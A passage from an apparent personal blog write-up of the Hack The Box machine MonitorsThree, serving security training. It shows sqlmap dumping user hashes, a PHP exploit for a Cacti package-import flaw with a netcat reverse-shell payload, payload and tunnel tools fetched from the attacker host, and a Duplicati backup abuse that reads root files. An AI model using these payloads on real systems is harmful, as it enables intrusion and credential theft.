</span><span style=color:#a3be8c>
</span><span style=color:#a3be8c>[*] ending @ 17:52:42 /2024-08-25/
</span></code></pre><p><br> Now we know the db, we can enumerate the tables<pre class=language-bash data-lang=bash style=color:#c0c5ce;background-color:#2b303b><code class=language-bash data-lang=bash><span style=color:#bf616a>sqlmap -u</span><span> http://monitorsthree.htb/forgot_password.php</span><span style=color:#bf616a> --data</span><span>="</span><span style=color:#a3be8c>username=*</span><span>"</span><span style=color:#bf616a> --dbms</span><span>=mysql</span><span style=color:#bf616a> -D</span><span> monitorsthree_db</span><span style=color:#bf616a> --tables
</span><span>        </span><span style=color:#bf616a>___
</span><span>       </span><span style=color:#bf616a>__H__                                                                                                                                                
</span><span> </span><span style=color:#bf616a>___</span><span> ___</span><span style=color:#b48ead>[</span><span>.</span><span style=color:#b48ead>]</span><span>_____ ___ ___  {1.8.4.7#dev}                                                                                                                     
</span><span>|</span><span style=color:#bf616a>_</span><span> -| </span><span style=color:#96b5b4>. </span><span style=color:#b48ead>[</span><span>)</span><span style=color:#b48ead>]     </span><span>| </span><span style=color:#bf616a>.</span><span>'</span><span style=color:#a3be8c>| . |                                                                                                                                   
</span><span style=color:#a3be8c>|___|_  ["]_|_|_|__,|  _|                                                                                                                                   
</span><span style=color:#a3be8c>      |_|V...       |_|   https://sqlmap.org                                                                                                                
</span><span style=color:#a3be8c>
</span><span style=color:#a3be8c>[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user</span><span>'</span><span style=color:#bf616a>s</span><span> responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
</span><span>
</span><span style=color:#bf616a>[*]</span><span> starting @ 17:53:21 /2024-08-25/
</span><span>
</span><span style=color:#bf616a>custom</span><span> injection marker ('</span><span style=color:#a3be8c>*</span><span>') </span><span style=color:#bf616a>found</span><span> in POST body. Do you want to process it? </span><span style=color:#b48ead>[</span><span>Y/n/q</span><span style=color:#b48ead>]</span><span> Y
</span><span style=color:#bf616a>[17:53:22] </span><span style=color:#b48ead>[</span><span>INFO</span><span style=color:#b48ead>]</span><span> testing connection to the target URL
</span><span style=color:#bf616a>got</span><span> a 302 redirect to '</span><span style=color:#a3be8c>http://monitorsthree.htb/forgot_password.php</span><span>'. Do you want to follow? </span><span style=color:#b48ead>[</span><span>Y/n</span><span style=color:#b48ead>]</span><span> Y
</span><span style=color:#bf616a>redirect</span><span> is a result of a POST request. Do you want to resend original POST data to a new location? </span><span style=color:#b48ead>[</span><span>Y/n</span><span style=color:#b48ead>]</span><span> Y
</span><span style=color:#bf616a>you</span><span> have not declared cookie(s)</span><span style=color:#bf616a>,</span><span> while server wants to set its own ('</span><span style=color:#a3be8c>PHPSESSID=jv5docc3e66...ursbfj60jq</span><span>')</span><span style=color:#96b5b4>.</span><span> Do you want to use those </span><span style=color:#b48ead>[</span><span>Y/n</span><span style=color:#b48ead>]</span><span> Y
</span><span style=color:#bf616a>sqlmap</span><span> resumed the following injection point(s) </span><span style=color:#bf616a>from</span><span> stored session:
</span><span style=color:#bf616a>---
</span><span style=color:#bf616a>Parameter: </span><span style=color:#65737e>#1* ((custom) POST)
</span><span>    </span><span style=color:#bf616a>Type:</span><span> time-based blind
</span><span>    </span><span style=color:#bf616a>Title:</span><span> MySQL >= 5.0.12 AND time-based blind (query SLEEP)
</span><span>    </span><span style=color:#bf616a>Payload:</span><span> username='</span><span style=color:#a3be8c> AND (SELECT 7658 FROM (SELECT(SLEEP(5)))HuDg) AND </span><span>'wNqd'</span><span style=color:#a3be8c>=</span><span>'wNqd
</span><span style=color:#bf616a>---
</span><span style=color:#bf616a>[17:53:25] </span><span style=color:#b48ead>[</span><span>INFO</span><span style=color:#b48ead>]</span><span> testing MySQL
</span><span style=color:#bf616a>[17:53:25] </span><span style=color:#b48ead>[</span><span>INFO</span><span style=color:#b48ead>]</span><span> confirming MySQL
</span><span style=color:#bf616a>[17:53:25] </span><span style=color:#b48ead>[</span><span>INFO</span><span style=color:#b48ead>]</span><span> the back-end DBMS is MySQL
</span><span style=color:#bf616a>web</span><span> server operating system: Linux Ubuntu
</span><span style=color:#bf616a>web</span><span> application technology: PHP, Nginx 1.18.0
</span><span style=color:#bf616a>back-end</span><span> DBMS: MySQL >= 5.0.0 (MariaDB fork)
</span><span style=color:#bf616a>[17:53:25] </span><span style=color:#b48ead>[</span><span>INFO</span><span style=color:#b48ead>]</span><span> fetching tables for database: '</span><span style=color:#a3be8c>monitorsthree_db</span><span>'
</span><span style=color:#bf616a>[17:53:25] </span><span style=color:#b48ead>[</span><span>INFO</span><span style=color:#b48ead>]</span><span> fetching number of tables for database '</span><span style=color:#a3be8c>monitorsthree_db</span><span>'
</span><span style=color:#bf616a>[17:53:25] </span><span style=color:#b48ead>[</span><span>WARNING</span><span style=color:#b48ead>]</span><span> time-based comparison requires larger statistical model, please wait.............................. (done)                             
</span><span style=color:#b48ead>do </span><span style=color:#bf616a>you</span><span> want sqlmap to try to optimize value(s) </span><span style=color:#b48ead>for</span><span> DBMS delay responses (option '</span><span style=color:#a3be8c>--time-sec</span><span>')</span><span style=color:#bf616a>? </span><span style=color:#b48ead>[</span><span>Y/n</span><span style=color:#b48ead>]</span><span> Y
</span><span>
</span><span style=color:#bf616a>[6</span><span> tables]
</span><span style=color:#bf616a>+---------------+
</span><span>| </span><span style=color:#bf616a>changelog     </span><span>|
</span><span>| </span><span style=color:#bf616a>customers     </span><span>|
</span><span>| </span><span style=color:#bf616a>invoice_tasks </span><span>|
</span><span>| </span><span style=color:#bf616a>invoices      </span><span>|
</span><span>| </span><span style=color:#bf616a>tasks         </span><span>|
</span><span>| </span><span style=color:#bf616a>users         </span><span>|
</span><span style=color:#bf616a>+---------------+
</span><span>
</span><span style=color:#bf616a>[18:30:56] </span><span style=color:#b48ead>[</span><span>INFO</span><span style=color:#b48ead>]</span><span> fetched data logged to text files under '</span><span style=color:#a3be8c>/root/.local/share/sqlmap/output/monitorsthree.htb</span><span>'
</span><span>
</span><span style=color:#bf616a>[*]</span><span> ending @ 18:30:56 /2024-08-25/
</span></code></pre><p><br> Very interesting ! we can skip the enumerations of rows and try the basics one with username and password<pre class=language-bash data-lang=bash style=color:#c0c5ce;background-color:#2b303b><code class=language-bash data-lang=bash><span style=color:#bf616a>sqlmap -u</span><span> http://monitorsthree.htb/forgot_password.php</span><span style=color:#bf616a> --data</span><span>="</span><span style=color:#a3be8c>username=*</span><span>"</span><span style=color:#bf616a> --dbms</span><span>=mysql</span><span style=color:#bf616a> -D</span><span> monitorsthree_db</span><span style=color:#bf616a> -T</span><span> users</span><span style=color:#bf616a> -C</span><span> username,password</span><span style=color:#bf616a> --dump
</span><span style=color:#bf616a>[19:14:41] </span><span style=color:#b48ead>[</span><span>INFO</span><span style=color:#b48ead>]</span><span> retrieved: janderson
</span><span style=color:#bf616a>[19:21:59] </span><span style=color:#b48ead>[</span><span>INFO</span><span style=color:#b48ead>]</span><span> retrieved: 31a181c8372e3afc59dab863430610e8
</span><span style=color:#bf616a>[19:47:56] </span><span style=color:#b48ead>[</span><span>INFO</span><span style=color:#b48ead>]</span><span> retrieved: admin
</span><span style=color:#bf616a>[19:51:34] </span><span style=color:#b48ead>[</span><span>INFO</span><span style=color:#b48ead>]</span><span> retrieved: 633b683cc128fe244b00f176c8a950f5
</span><span style=color:#bf616a>[20:19:33] </span><span style=color:#b48ead>[</span><span>INFO</span><span style=color:#b48ead>]</span><span> retrieved: dthompson
</span><span style=color:#bf616a>[20:28:33] </span><span style=color:#b48ead>[</span><span>INFO</span><span style=color:#b48ead>]</span><span> retrieved: c585d01f2eb3e6e1073e92
</span></code></pre><p><br> Let’s use <a href=https://crackstation.net/>crackstation</a> and crack the admin hash <img alt=crackstation src=https://f4doli.github.io/Blog/htb-monitorsthree/crackstation.png> <br> Come back to our cacti login page, and try these crendetials <img alt="cacti login page" src=https://f4doli.github.io/Blog/htb-monitorsthree/cacti_login.png> <br> Ok so let’s review a little bit what we have done now :<ul><li>We found the version of cacti, which is 1.2.26<li>We found a SQLi and credentials to authenticate to cacti</ul><p>After some research, I have found a PoC which can give us a <a href=https://github.com/Cacti/cacti/security/advisories/GHSA-7cmj-g5qc-pj88>RCE</a><h2 id=foothold>Foothold</h2><p>To obtain this RCE, we have to perform some actions first. We need to create the following file, and modify the <code>$filedata</code> variable with your ip adress and the port you’ll use for your listener<pre class=language-php data-lang=php style=color:#c0c5ce;background-color:#2b303b><code class=language-php data-lang=php><span style=color:#ab7967>&LT?php
</span><span>
</span><span>$</span><span style=color:#bf616a>xmldata </span><span>= "</span><span style=color:#a3be8c>&LTxml>
</span><span style=color:#a3be8c>   &LTfiles>
</span><span style=color:#a3be8c>       &LTfile>
</span><span style=color:#a3be8c>           &LTname>resource/test.php&LT/name>
</span><span style=color:#a3be8c>           &LTdata>%s&LT/data>
</span><span style=color:#a3be8c>           &LTfilesignature>%s&LT/filesignature>
</span><span style=color:#a3be8c>       &LT/file>
</span><span style=color:#a3be8c>   &LT/files>
</span><span style=color:#a3be8c>   &LTpublickey>%s&LT/publickey>
</span><span style=color:#a3be8c>   &LTsignature>&LT/signature>
</span><span style=color:#a3be8c>&LT/xml></span><span>";
</span><span>$</span><span style=color:#bf616a>filedata </span><span>= "</span><span style=color:#a3be8c>&LT?php system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc 10.10.14.185 1234 >/tmp/f'); ?></span><span>";
</span><span>$</span><span style=color:#bf616a>keypair </span><span>= </span><span style=color:#96b5b4>openssl_pkey_new</span><span>();
</span><span>$</span><span style=color:#bf616a>public_key </span><span>= </span><span style=color:#96b5b4>openssl_pkey_get_details</span><span>($</span><span style=color:#bf616a>keypair</span><span>)["</span><span style=color:#a3be8c>key</span><span>"];
</span><span style=color:#96b5b4>openssl_sign</span><span>($</span><span style=color:#bf616a>filedata</span><span>, $</span><span style=color:#bf616a>filesignature</span><span>, $</span><span style=color:#bf616a>keypair</span><span>, </span><span style=color:#d08770>OPENSSL_ALGO_SHA256</span><span>);
</span><span>$</span><span style=color:#bf616a>data </span><span>= </span><span style=color:#96b5b4>sprintf</span><span>($</span><span style=color:#bf616a>xmldata</span><span>, </span><span style=color:#96b5b4>base64_encode</span><span>($</span><span style=color:#bf616a>filedata</span><span>), </span><span style=color:#96b5b4>base64_encode</span><span>($</span><span style=color:#bf616a>filesignature</span><span>), </span><span style=color:#96b5b4>base64_encode</span><span>($</span><span style=color:#bf616a>public_key</span><span>));
</span><span style=color:#96b5b4>openssl_sign</span><span>($</span><span style=color:#bf616a>data</span><span>, $</span><span style=color:#bf616a>signature</span><span>, $</span><span style=color:#bf616a>keypair</span><span>, </span><span style=color:#d08770>OPENSSL_ALGO_SHA256</span><span>);
</span><span style=color:#96b5b4>file_put_contents</span><span>("</span><span style=color:#a3be8c>test.xml</span><span>", </span><span style=color:#96b5b4>str_replace</span><span>("</span><span style=color:#a3be8c>&LTsignature>&LT/signature></span><span>", "</span><span style=color:#a3be8c>&LTsignature></span><span>".</span><span style=color:#96b5b4>base64_encode</span><span>($</span><span style=color:#bf616a>signature</span><span>)."</span><span style=color:#a3be8c>&LT/signature></span><span>", $</span><span style=color:#bf616a>data</span><span>));
</span><span style=color:#96b5b4>system</span><span>("</span><span style=color:#a3be8c>cat test.xml | gzip -9 > test.xml.gz; rm test.xml</span><span>");
</span><span>
</span><span style=color:#ab7967>?>
</span></code></pre><p><br> The file we created will generate a zip file. Let’s generate it<pre class=language-bash data-lang=bash style=color:#c0c5ce;background-color:#2b303b><code class=language-bash data-lang=bash><span style=color:#bf616a>php</span><span> shell.php
</span></code></pre><p><br> Start a listener with the port you selected in your file<pre class=language-bash data-lang=bash style=color:#c0c5ce;background-color:#2b303b><code class=language-bash data-lang=bash><span style=color:#bf616a>pwncat-cs</span><span> :1234
</span><span style=color:#bf616a>[20:13:30]</span><span> Welcome to pwncat 🐈
</span></code></pre><p><br> As you can see in the PoC, to obtain the RCE we’ll have to go on the import package page, and upload our zip file as follow <img alt="cacti package" src=https://f4doli.github.io/Blog/htb-monitorsthree/cacti_package.png> <br> Back again on our listener, we can obtain a shell<pre class=language-bash data-lang=bash style=color:#c0c5ce;background-color:#2b303b><code class=language-bash data-lang=bash><span style=color:#bf616a>pwncat-cs</span><span> :1234
</span><span style=color:#bf616a>[20:13:30]</span><span> Welcome to pwncat 🐈!                                                                                                             __main__.py:164
</span><span style=color:#bf616a>[20:14:19]</span><span> received connection from 10.129.194.178:56688                                                                                          bind.py:84
</span><span style=color:#bf616a>[20:14:20]</span><span> 10.129.194.178:56688: registered new host w/ db                                                                                    manager.py:957
</span><span>(</span><span style=color:#b48ead>local</span><span>) pwncat$                                                                                                                                             
</span><span>(</span><span style=color:#bf616a>remote</span><span>) www-data@monitorsthree:/var/www/html/cacti/resource$ whoami
</span><span style=color:#bf616a>www-data
</span></code></pre><h2 id=privilege-escalation>Privilege Escalation</h2><p>In the <code>/opt</code> folder, there is a sqlite database for <a href=https://duplicati.com/>duplicati</a><pre class=language-bash data-lang=bash style=color:#c0c5ce;background-color:#2b303b><code class=language-bash data-lang=bash><span>(</span><span style=color:#bf616a>remote</span><span>) www-data@monitorsthree:/opt/duplicati/config$ strings Duplicati-server.sqlite | </span><span style=color:#bf616a>grep -i</span><span> pass</span><span style=color:#bf616a> -C</span><span> 4
</span><span style=color:#bf616a>compression-modulezip
</span><span style=color:#bf616a>encryption-module
</span><span style=color:#bf616a>allowed-hostnames*</span><span>"</span><span style=color:#a3be8c>M
</span><span style=color:#a3be8c>disable-tray-icon-loginfalse+L
</span><span style=color:#a3be8c>has-asked-for-password-protectiontrue
</span><span style=color:#a3be8c>usage-reporter-level
</span><span style=color:#a3be8c>update-channel%I
</span><span style=color:#a3be8c>has-fixed-invalid-backup-idTrue
</span><span style=color:#a3be8c>server-ssl-certificate G
</span><span style=color:#a3be8c>--
</span><span style=color:#a3be8c>unacked-errorFalse
</span><span style=color:#a3be8c>update-check-latest
</span><span style=color:#a3be8c>update-check-interval)B
</span><span style=color:#a3be8c>last-update-check638601835622365870QA
</span><span style=color:#a3be8c>server-passphrase-trayicon-hashEuXBCX/JsuQdz0xDzpjeggXfKgZxnPJh7FP7XoZTHZk=D@
</span><span style=color:#a3be8c>server-passphrase-trayiconc39026a0-8a6b-4601-ae70-f6a2717dde6dH?
</span><span style=color:#a3be8c>server-passphrase-saltxTfykWV1dATpFZvPhClEJLJzYA5A4L74hX7FK8XmY0I=C>
</span><span style=color:#a3be8c>server-passphraseWb6e855L3sN9LTaCuwPXuautswTIQbekmMAr7BrK2Ho=
</span><span style=color:#a3be8c>server-port-changedTrue
</span><span style=color:#a3be8c>is-first-run
</span><span style=color:#a3be8c>last-webserver-port8200
</span><span style=color:#a3be8c>thread-priority
</span></code></pre><p><br> With simple research we find a <a href=https://github.com/duplicati/duplicati/issues/5197>PoC</a> to bypass the authentication of duplicati server <br> <br> We’ll need to forward the local port of the remote machine on our local machine to access duplicati server. Let’s upload <a href=https://github.com/jpillora/chisel>chisel</a><pre class=language-bash data-lang=bash style=color:#c0c5ce;background-color:#2b303b><code class=language-bash data-lang=bash><span>(</span><span style=color:#bf616a>remote</span><span>) www-data@monitorsthree:/tmp$ wget http://10.10.14.85/chisel 
</span><span style=color:#bf616a>--2024-08-25</span><span> 18:59:07--  http://10.10.14.85/chisel
</span><span style=color:#bf616a>Connecting</span><span> to 10.10.14.85:80... connected.
</span><span style=color:#bf616a>HTTP</span><span> request sent, awaiting response... 200 OK
</span><span style=color:#bf616a>Length:</span><span> 117 </span><span style=color:#b48ead>[</span><span>application/octet-stream</span><span style=color:#b48ead>]
</span><span style=color:#bf616a>Saving</span><span> to: '</span><span style=color:#a3be8c>chisel</span><span>'
</span><span>
</span><span style=color:#bf616a>chisel</span><span>                                 100%</span><span style=color:#b48ead>[</span><span>============================================================================></span><span style=color:#b48ead>]</span><span>     117  --.-KB/s    in 0s      
</span><span>
</span><span style=color:#bf616a>2024-08-25</span><span> 18:59:07 (7.88 MB/s) </span><span style=color:#bf616a>- </span><span>'</span><span style=color:#a3be8c>chisel</span><span>' saved </span><span style=color:#b48ead>[</span><span>117/117</span><span style=color:#b48ead>]
</span></code></pre><p><br> On your machine, run chisel with the server argument and select a port for the forwarding<pre class=language-bash data-lang=bash style=color:#c0c5ce;background-color:#2b303b><code class=language-bash data-lang=bash><span style=color:#bf616a>chisel</span><span> server</span><span style=color:#bf616a> -p</span><span> 4444 reverse
</span><span>
</span><span style=color:#bf616a>2024/08/25</span><span> 21:02:07 server: Fingerprint cQvXy2VMdsnHf6dxMGY9Vem7rUxPEk3YSk/YKB2Mwuk=
</span><span style=color:#bf616a>2024/08/25</span><span> 21:02:07 server: Listening on http://0.0.0.0:4444
</span></code></pre><p><br> Now, on the remote machine, run the following command to begin the port forwarding<pre class=language-bash data-lang=bash style=color:#c0c5ce;background-color:#2b303b><code class=language-bash data-lang=bash><span>(</span><span style=color:#bf616a>remote</span><span>) www-data@monitorsthree:/tmp$ ./chisel client 10.10.14.85:4444 R:4445:localhost:8200
</span><span style=color:#bf616a>2024/08/25</span><span> 19:09:18 client: Connecting to ws://10.10.14.85:4444
</span><span style=color:#bf616a>2024/08/25</span><span> 19:09:18 client: Connected (Latency 29.036286ms)
</span></code></pre><p><br> You can now access to duplicati on your local port, to bypass the authentication, just follow the PoC. It is really easy to do so I’ll not describe each steps here. <br> <br> Once done, you’ll have access to duplicati <img alt="duplicati login" src=https://f4doli.github.io/Blog/htb-monitorsthree/duplicati_login.png> <br> Because we can backup the entire system with Duplicati, what I though first was to make a backup of <code>/root</code> and <code>/home</code> to obtain the flags. <br> <br> Let’s do that. we’ll begin by creating a new backup <img alt="backup duplicati" src=https://f4doli.github.io/Blog/htb-monitorsthree/backup1.png> <br> Give a name for your backup (not important but required) and disable the encryption <img alt="name of backup" src=https://f4doli.github.io/Blog/htb-monitorsthree/backup2.png> <br> Ok, before create the destination, there is something important to understand. Duplicati is running in a docker container, which means some docker volumes are used to permit the container to access to the file of the machine. You can see these volumes in the docker compose file<pre class=language-bash data-lang=bash style=color:#c0c5ce;background-color:#2b303b><code class=language-bash data-lang=bash><span>(</span><span style=color:#bf616a>remote</span><span>) www-data@monitorsthree:/tmp/home/marcus/.ssh$ cat /opt/docker-compose.yml 
</span><span style=color:#bf616a>version: </span><span>"</span><span style=color:#a3be8c>3</span><span>"
</span><span>
</span><span style=color:#bf616a>services:
</span><span>  </span><span style=color:#bf616a>duplicati:
</span><span>    </span><span style=color:#bf616a>image:</span><span> lscr.io/linuxserver/duplicati:latest
</span><span>    </span><span style=color:#bf616a>container_name:</span><span> duplicati
</span><span>    </span><span style=color:#bf616a>environment:
</span><span>      </span><span style=color:#bf616a>-</span><span> PUID=0
</span><span>      </span><span style=color:#bf616a>-</span><span> PGID=0
</span><span>      </span><span style=color:#bf616a>-</span><span> TZ=Etc/UTC
</span><span>    </span><span style=color:#bf616a>volumes:
</span><span>      </span><span style=color:#bf616a>-</span><span> /opt/duplicati/config:/config
</span><span>      </span><span style=color:#bf616a>-</span><span> /:/source
</span><span>    </span><span style=color:#bf616a>ports:
</span><span>      </span><span style=color:#bf616a>-</span><span> 127.0.0.1:8200:8200
</span><span>    </span><span style=color:#bf616a>restart:</span><span> unless-stopped
</span></code></pre><p><br> If you want to access to the root of the machine, you’ll have to select <code>/source</code> as a root for the backup destination, as follow <img alt="backup destination" src=https://f4doli.github.io/Blog/htb-monitorsthree/backup3.png> <br> For the source (what we want to backup), just select <code>/root</code> and <code>/home</code> (if you understood, it means you have to select <code>/source/root</code> and <code>/source/home</code>) <img alt="backup source data" src=https://f4doli.github.io/Blog/htb-monitorsthree/backup4.png> <br> For the schedule part, just let the default options, it’s honestly don’t important. Once done, just lick on <code>Run now</code> <img alt="run backup" src=https://f4doli.github.io/Blog/htb-monitorsthree/backup5.png> <br> It should be instant, after that go on your backup and select <code>Restore file</code> <img alt="restore file" src=https://f4doli.github.io/Blog/htb-monitorsthree/backup6.png> <br> Select the files we saved previously <img alt="select restore files" src=https://f4doli.github.io/Blog/htb-monitorsthree/backup7.png> <br> Important ! don’t restore the permissions if you want to acess to the folders <img alt="file permissions restore" src=https://f4doli.github.io/Blog/htb-monitorsthree/backup8.png> <br> If you want some fun, you can also try to obtain a root acess to the machine, duplicati can run some <a href=https://github.com/duplicati/duplicati/blob/master/Duplicati/Library/Modules/Builtin/run-script-example.sh>scripts</a>. I really liked this one ! The duplicati bypass was very fun to do.</article><hr><nav id=post-nav><a class="post-nav-item post-nav-prev" href=https://f4doli.github.io/Blog/htb-editorial/> <div class=nav-arrow>Previous</div> <span class=post-title>Writeup of Editorial</span> </a></nav><div class=dialog-buttons><a class=inline-button href=#top>Go to Top</a></div></div><footer id=site-footer><p>© F4doli's blog, 2024<p><small> Powered by <a class=link href=https://www.getzola.org>Zola</a> and <a class=link href=https://duckquill.daudix.one>Duckquill</a> </small><ul id=socials><li><a rel=" me" title="Hack The Box" href=https://app.hackthebox.com/profile/1516668> <i style="-webkit-mask-image:url(&#34data:image/svg+xml,%3Csvg role='img' viewBox='0 0 24 24' xmlns='http://www.w3.org/2000/svg'%3E%3Ctitle%3EHack The Box%3C/title%3E%3Cpath d='m22.5106 6.4566.0008-.0123a.888.888 0 0 0-.2717-.6384c-.0084-.0084-.018-.0155-.0267-.0235-.0186-.0166-.0371-.0333-.0572-.0484-.0193-.0147-.04-.0276-.0607-.0406-.0096-.006-.0182-.0131-.0281-.0188L12.4576.1266a.891.891 0 0 0-.9223.0043L1.933 5.6744c-.0107.0062-.0203.014-.0307.0205-.0073.0047-.015.008-.0223.0128-.007.0047-.013.0106-.02.0155a.8769.8769 0 0 0-.147.1333l-.0026.003a.8872.8872 0 0 0-.2218.5847l.0009.014c-.0002.0088-.0015.0176-.0015.0264v11.0708c0 .3277.1802.6288.469.7836l9.5986 5.5417c.0076.0044.0158.0075.0236.0117a.8754.8754 0 0 0 .166.0687c.0134.004.0266.0083.0401.0117a.8793.8793 0 0 0 .072.0142c.0117.0019.0232.0045.0349.006a.835.835 0 0 0 .2157 0c.0117-.0015.0232-.0041.0348-.006a.9.9 0 0 0 .072-.0142c.0135-.0034.0267-.0077.04-.0117a.895.895 0 0 0 .0646-.0217.9134.9134 0 0 0 .1015-.047c.0078-.0042.016-.0072.0236-.0117l9.5986-5.5417a.8888.8888 0 0 0 .469-.7836V6.4779c0-.0071-.0012-.0142-.0014-.0213zM5.2543 6.0822l6.5367-3.774a.4182.4182 0 0 1 .4182 0l6.5366 3.774a.4182.4182 0 0 1 0 .7243l-6.5367 3.774a.4182.4182 0 0 1-.4182 0l-6.5366-3.774a.4182.4182 0 0 1 0-.7243zm5.6134 14.3449a.4172.4172 0 0 1-.626.3613L3.718 17.0218a.4173.4173 0 0 1-.2086-.3613V9.1279a.4172.4172 0 0 1 .6258-.3613l6.524 3.7666a.4172.4172 0 0 1 .2086.3614v7.5325zm9.623-3.7666a.4173.4173 0 0 1-.2086.3613l-6.5239 3.7666a.4172.4172 0 0 1-.6259-.3613v-7.5325c0-.149.0796-.2868.2087-.3614l6.5239-3.7666a.4172.4172 0 0 1 .6258.3613v7.5326z'/%3E%3C/svg%3E&#34);mask-image:url(&#34data:image/svg+xml,%3Csvg role='img' viewBox='0 0 24 24' xmlns='http://www.w3.org/2000/svg'%3E%3Ctitle%3EHack The Box%3C/title%3E%3Cpath d='m22.5106 6.4566.0008-.0123a.888.888 0 0 0-.2717-.6384c-.0084-.0084-.018-.0155-.0267-.0235-.0186-.0166-.0371-.0333-.0572-.0484-.0193-.0147-.04-.0276-.0607-.0406-.0096-.006-.0182-.0131-.0281-.0188L12.4576.1266a.891.891 0 0 0-.9223.0043L1.933 5.6744c-.0107.0062-.0203.014-.0307.0205-.0073.0047-.015.008-.0223.0128-.007.0047-.013.0106-.02.0155a.8769.8769 0 0 0-.147.1333l-.0026.003a.8872.8872 0 0 0-.2218.5847l.0009.014c-.0002.0088-.0015.0176-.0015.0264v11.0708c0 .3277.1802.6288.469.7836l9.5986 5.5417c.0076.0044.0158.0075.0236.0117a.8754.8754 0 0 0 .166.0687c.0134.004.0266.0083.0401.0117a.8793.8793 0 0 0 .072.0142c.0117.0019.0232.0045.0349.006a.835.835 0 0 0 .2157 0c.0117-.0015.0232-.0041.0348-.006a.9.9 0 0 0 .072-.0142c.0135-.0034.0267-.0077.04-.0117a.895.895 0 0 0 .0646-.0217.9134.9134 0 0 0 .1015-.047c.0078-.0042.016-.0072.0236-.0117l9.5986-5.5417a.8888.8888 0 0 0 .469-.7836V6.4779c0-.0071-.0012-.0142-.0014-.0213zM5.2543 6.0822l6.5367-3.774a.4182.4182 0 0 1 .4182 0l6.5366 3.774a.4182.4182 0 0 1 0 .7243l-6.5367 3.774a.4182.4182 0 0 1-.4182 0l-6.5366-3.774a.4182.4182 0 0 1 0-.7243zm5.6134 14.3449a.4172.4172 0 0 1-.626.3613L3.718 17.0218a.4173.4173 0 0 1-.2086-.3613V9.1279a.4172.4172 0 0 1 .6258-.3613l6.524 3.7666a.4172.4172 0 0 1 .2086.3614v7.5325zm9.623-3.7666a.4173.4173 0 0 1-.2086.3613l-6.5239 3.7666a.4172.4172 0 0 1-.6259-.3613v-7.5325c0-.149.0796-.2868.2087-.3614l6.5239-3.7666a.4172.4172 0 0 1 .6258.3613v7.5326z'/%3E%3C/svg%3E&#34)" class=icon></i> <span>Hack The Box</span> </a><li><a rel=" me" href=https://www.root-me.org/F4doli title=Root-me> <i style="-webkit-mask-image:url(&#34data:image/svg+xml,%3Csvg role='img' viewBox='0 0 24 24' xmlns='http://www.w3.org/2000/svg'%3E%3Ctitle%3ERoot Me%3C/title%3E%3Cpath d='M21.364 9.897c0-.448-.029-.896-.096-1.325 0-.028-.009-.057-.009-.086-.582-3.785-3.452-6.894-7.228-7.723-.095-.429-.477-.753-.934-.753-.534 0-.964.429-.964.963 0 .457.325.839.754.934v3.519c0 .057.028.114.076.152.029.019.067.029.105.029.019 0 .048 0 .067-.01l1.411-.534c.095.143.238.239.41.286v1.659c-.715.878-1.602 1.669-2.546 2.375l-1.077-2.499c.2-.133.333-.352.333-.61 0-.4-.324-.734-.734-.734-.4 0-.734.324-.734.734 0 .401.324.734.734.734h.038l1.125 2.603c-.658.477-1.335.906-2.002 1.297l-3.204-.963c-.038-.009-.076-.009-.114.01l-.954.372c-.133-.182-.343-.296-.591-.296-.4 0-.734.324-.734.734 0 .401.324.734.734.734.401 0 .734-.324.734-.734 0-.028-.009-.057-.009-.086l.896-.352 2.794.839c-2.384 1.335-4.52 2.107-4.873 2.231l-.171.057a.9205.9205 0 0 0-.553-.181h-.029c-.448-1.058-.677-2.212-.677-3.366 0-.572.057-1.135.162-1.678H7.69c.086.315.362.543.706.543.4 0 .734-.324.734-.734 0-.4-.324-.734-.734-.734-.344 0-.62.229-.706.543h-4.1c.772-3.137 3.251-5.644 6.455-6.388.172.276.477.467.82.467.534 0 .963-.429.963-.963S11.399 0 10.865 0c-.467 0-.848.334-.944.763-4.205.953-7.285 4.739-7.285 9.125 0 1.249.248 2.498.735 3.642-.181.172-.286.42-.286.687 0 .429.276.782.658.915v3.757c0 .067.019.134.057.191l.21.143 2.851 2.012v2.403c0 .2.162.362.362.362h9.535c.2 0 .362-.162.362-.362v-2.403l2.861-2.012.21-.153a.3437.3437 0 0 0 .057-.19v-3.786c.353-.143.601-.486.601-.887 0-.248-.096-.476-.248-.648.505-1.135.763-2.393.763-3.662Zm-1.383 3.366h-.086c-.534 0-.963.429-.963.963 0 .41.258.763.629.897v3.509l-3.003 2.117c-.096.066-.153.181-.153.295v2.022c0 .114-.095.209-.21.209H15.08c-.115 0-.21-.095-.21-.209v-.725c0-.191-.133-.362-.324-.382-.219-.019-.401.153-.401.363v.753c0 .115-.095.21-.209.21h-1.364a.212.212 0 0 1-.21-.21v-1.116c0-.19-.133-.362-.324-.381-.219-.019-.4.153-.4.362v1.145c0 .114-.096.209-.21.209h-1.364a.2109.2109 0 0 1-.209-.209v-.744c0-.191-.134-.362-.325-.382-.219-.019-.4.153-.4.363v.753c0 .115-.095.21-.21.21H7.805c-.115 0-.21-.095-.21-.21v-2.021c0-.115-.057-.229-.153-.296l-2.994-2.117v-3.547a.9594.9594 0 0 0 .563-.877c0-.057-.01-.114-.019-.172.381-.133 3.289-1.173 6.15-2.956 3.871-2.412 6.017-5.149 6.264-7.961 1.669 1.344 2.823 3.289 3.157 5.473-.048 4.777-8.372 7.723-8.458 7.752-.019.009-.067.019-.105.038-.105-.019-.21-.038-.324-.057-.076-.019-.162-.029-.239-.048-.124-.019-.247-.048-.371-.076-.02-.01-.048-.01-.067-.01-.048-.009-.096-.019-.143-.028-.057-.01-.115-.029-.172-.039-.133-.028-.267-.057-.391-.095-.238-.057-.467-.124-.696-.181-.219-.067-.448-.124-.658-.191H8.92c-.162-.047-.315-.095-.467-.152a.9996.9996 0 0 0-.153-.048c-.076-.029-.143-.048-.209-.067-.124-.038-.239-.076-.344-.124h-.009a5.9785 5.9785 0 0 1-.458-.171c-.143-.058-.267-.105-.362-.143-.096-.048-.181-.077-.229-.105-.057-.029-.086-.038-.086-.038s.019.028.057.066c.038.048.096.115.181.191.077.076.182.172.306.267.124.095.267.2.419.305h.01c-.058.191-.096.401-.096.61 0 1.097.897 1.993 1.993 1.993.849 0 1.573-.534 1.86-1.287.095.01.2.019.295.029.172.009.334.009.486.009.01 0 .019.01.029.01l1.611 1.64c.41.41 1.049.477 1.526.162l2.517-1.411c.22-.143.363-.391.363-.658v-2.899c.972-.772 1.85-1.688 2.422-2.727-.105.753-.305 1.468-.601 2.145Zm-7.799 